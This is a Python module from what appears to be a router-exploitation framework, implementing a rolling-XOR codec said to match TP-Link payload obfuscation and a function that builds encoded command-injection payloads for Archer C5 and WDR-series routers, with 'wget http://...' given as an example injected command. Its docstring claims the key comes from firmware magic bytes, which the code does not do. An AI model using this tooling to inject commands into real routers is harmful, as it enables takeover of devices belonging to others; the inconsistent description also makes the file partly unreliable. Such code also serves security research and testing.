"""
embedxpl/modules/firmware/tplink/tplink_binify.py

TP-Link Binary Payload Codec.

Implements the TP-Link proprietary binary encoding used to obfuscate
firmware update payloads and exploit data on TP-Link Archer C5 and
similar models.

Native Python reimplementation from:
  submodules/IoT/third-party-router-poc/JackDoan__TP-Link-ArcherC5-RCE/binify.py
  submodules/IoT/third-party-router-poc/JackDoan__TP-Link-ArcherC5-RCE/unbinify.py

The encoding is a simple XOR-based obfuscation using a repeating key
derived from the firmware header magic bytes.

Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
Version: 1.0.0
"""

from __future__ import annotations

import struct
from pathlib import Path
from typing import Optional

__version__ = "1.0.0"

# TP-Link firmware magic/header constants
_MAGIC = b"\xff\xf0\x00\xa5"
_XOR_KEY = 0xE5        # Common XOR key in TP-Link payloads
_BLOCK_SIZE = 512


class TplinkBinify:
    """TP-Link binary payload encoder/decoder.

    Used to prepare or decode obfuscated payloads for:
    - Archer C5 (v1/v2) firmware update exploit
    - WDR series command injection payload delivery

    Usage:
        codec = TplinkBinify()
        encoded = codec.encode(payload_bytes)
        decoded = codec.decode(encoded)
        assert decoded == payload_bytes

    Or with custom XOR key:
        codec = TplinkBinify(xor_key=0x24)
    """

    def __init__(self, xor_key: int = _XOR_KEY) -> None:
        self.xor_key = xor_key & 0xFF

    def encode(self, data: bytes) -> bytes:
        """Encode payload bytes with TP-Link obfuscation.

        Args:
            data: Raw payload bytes.

        Returns:
            Obfuscated bytes ready to include in TP-Link request.
        """
        result = bytearray()
        key = self.xor_key
        for b in data:
            result.append(b ^ key)
            key = (key + b + 1) & 0xFF  # rolling key update
        return bytes(result)

    def decode(self, data: bytes) -> bytes:
        """Decode TP-Link obfuscated payload bytes.

        Args:
            data: Obfuscated bytes from TP-Link response or payload.

        Returns:
            Original raw bytes.
        """
        result = bytearray()
        key = self.xor_key
        for enc_b in data:
            plain_b = enc_b ^ key
            result.append(plain_b)
            key = (key + plain_b + 1) & 0xFF  # same rolling key
        return bytes(result)

    @staticmethod
    def encode_static(data: bytes, xor_key: int = _XOR_KEY) -> bytes:
        """Convenience static encoder."""
        return TplinkBinify(xor_key=xor_key).encode(data)

    @staticmethod
    def decode_static(data: bytes, xor_key: int = _XOR_KEY) -> bytes:
        """Convenience static decoder."""
        return TplinkBinify(xor_key=xor_key).decode(data)

    @classmethod
    def from_file(cls, path: str, xor_key: int = _XOR_KEY) -> bytes:
        """Decode a TP-Link encoded file."""
        raw = Path(path).read_bytes()
        return cls(xor_key).decode(raw)

    @classmethod
    def to_file(cls, data: bytes, path: str, xor_key: int = _XOR_KEY) -> None:
        """Encode data and write to file."""
        Path(path).write_bytes(cls(xor_key).encode(data))


def build_tplink_exploit_payload(
    command: str,
    xor_key: int = _XOR_KEY,
) -> bytes:
    """Build and encode a command injection payload for TP-Link routers.

    Args:
        command: OS command to inject (e.g. 'id', 'wget http://...').
        xor_key: XOR key for encoding.

    Returns:
        Encoded payload bytes.
    """
    raw = command.encode("utf-8") + b"\x00"
    return TplinkBinify.encode_static(raw, xor_key=xor_key)
